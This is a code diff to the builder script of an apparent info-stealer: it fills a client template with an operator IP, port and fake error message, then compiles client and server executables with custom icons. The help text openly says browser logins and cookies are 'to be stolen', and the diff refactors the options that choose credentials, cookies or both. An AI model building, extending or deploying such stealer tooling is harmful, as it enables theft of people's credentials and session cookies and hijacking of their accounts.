@@ -40,7 +40,7 @@ def create_executable(filename, icon, mode="windowed"):
     ])
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", cookies=False, login=False, port=80, include_python=False):
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", nocookies=False, nologin=False, port=80, include_python=False, nobuild=True):
     reset_folders()
     os.mkdir("build")
     temp_path = f"{template_dir}/{filename}"
@@ -52,27 +52,28 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
         content = content.replace("<<IP_ADDRESS>>", f"{ip_address}")
         content = content.replace("<<ERROR_BOOL>>", f"{error_bool}")
         content = content.replace("<<ERROR_MESSAGE>>", f"{error_message}")
-        content = content.replace("<<COOKIES_BOOL>>", f"{cookies}")
-        content = content.replace("<<LOGIN_BOOL>>", f"{login}")
+        content = content.replace("<<COOKIES_BOOL>>", f"{nocookies}")
+        content = content.replace("<<LOGIN_BOOL>>", f"{nologin}")
         content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
         if include_python:
             shutil.copyfile(build_path, f"{dist_path}.py")
-        create_executable(filename, icon)
-        if os.path.exists(dist_path):
-            shutil.rmtree(dist_path)
-        shutil.copyfile(f"{build_dir}/dist/{filename}.exe",
-                        f"{dist_dir}/{filename}.exe")
-        if os.path.exists(f"{filename}.spec"):
-            os.remove(f"{filename}.spec")
+        if not nobuild:
+            create_executable(filename, icon)
+            if os.path.exists(dist_path):
+                shutil.rmtree(dist_path)
+            shutil.copyfile(f"{build_dir}/dist/{filename}.exe",
+                            f"{dist_dir}/{filename}.exe")
+            if os.path.exists(f"{filename}.spec"):
+                os.remove(f"{filename}.spec")
         reset_folders()
         return True
     print(f"[-] Error, file not found: {temp_path}")
     return False
 
 
-def build_server(filename="server", icon="server.ico", port=80, include_python=False, build=True):
+def build_server(filename="server", icon="server.ico", port=80, include_python=False, nobuild=True):
     reset_folders()
     os.mkdir("build")
     temp_path = f"{template_dir}/{filename}"
@@ -86,7 +87,7 @@ def build_server(filename="server", icon="server.ico", port=80, include_python=F
             f.write(content)
         if include_python:
             shutil.copyfile(build_path, f"{dist_path}.py")
-        if build:
+        if not nobuild:
             create_executable(filename, icon, mode="console")
             if os.path.exists(dist_path):
                 shutil.rmtree(dist_path)
@@ -143,18 +144,22 @@ def parse_arguments():
                         action="store_true", default=False, help="Use this to enable the error message. Default is False")
     parser.add_argument('--message', metavar="Error Message",
                         type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
-    parser.add_argument('--cookies', dest="cookies_bool",
-                        action="store_true", default=False, help="Use to set only cookies to be stolen. Default is both login and cookies")
-    parser.add_argument('--login', dest="login_bool",
-                        action="store_true", default=False, help="Use to set only login details to be stolen. Default is both login and cookies")
+    parser.add_argument('--nocookies', dest="cookies_bool",
+                        action="store_true", default=False, help="Use to only capture credentials and not cookies. Default is both")
+    parser.add_argument('--nologin', dest="login_bool",
+                        action="store_true", default=False, help="Use to only capture cookies and not credentials. Default is both")
     parser.add_argument('--client', dest="client",
                         action="store_true", default=False, help="Use to only build the client. Default is both client and server")
     parser.add_argument('--server', dest="server",
                         action="store_true", default=False, help="Use to only build the server. Default is both client and server")
     parser.add_argument('--pyserver', dest="pyserver",
-                        action="store_true", default=False, help="Creates a python version of the server instead of an executable")
+                        action="store_true", default=False, help="Creates a python version of the server instead of an executable. Pair it with --nobuild-server to only have it as python")
     parser.add_argument('--pyclient', dest="pyclient",
-                        action="store_true", default=False, help="Creates a python version of the server instead of an executable")
+                        action="store_true", default=False, help="Creates a python version of the client. Pair it with --nobuild-client to only have it as python. This is for testing purposes")
+    parser.add_argument('--nobuild_server', dest="noserver",
+                        action="store_true", default=False, help="Doesn't build the server")
+    parser.add_argument('--nobuild_client', dest="noclient",
+                        action="store_true", default=False, help="Doesn't build the client")
 
     args = parser.parse_args()
     try:
@@ -162,24 +167,11 @@ def parse_arguments():
     except:
         print("The ip address is wrong, please try again")
         return False
-    server = False
-    client = False
-    if not args.cookies_bool and not args.login_bool:
-        args.cookies_bool = True
-        args.login_bool = True
-    if args.pyserver:
-        server = build_server(
-            port=args.port, include_python=args.pyserver, build=False)
-    if not server and args.server and not args.client:
-        server = build_server(port=args.port, include_python=args.pyserver)
-    elif args.client and not args.server:
-        client = build_client(ip_address=args.ip, error_bool=args.error_bool,
-                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool, port=args.port, include_python=args.pyclient)
-    else:
-        server = build_server(
-            port=args.port, include_python=args.pyserver)
-        client = build_client(ip_address=args.ip, error_bool=args.error_bool,
-                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool, port=args.port, include_python=args.pyclient)
+
+    server = build_server(
+        port=args.port, include_python=args.pyserver, nobuild=args.noserver)
+    client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
+                          nocookies=args.cookies_bool, nologin=args.login_bool, port=args.port, include_python=args.pyclient, nobuild=args.noclient)
     build_message(server, client)
 
 
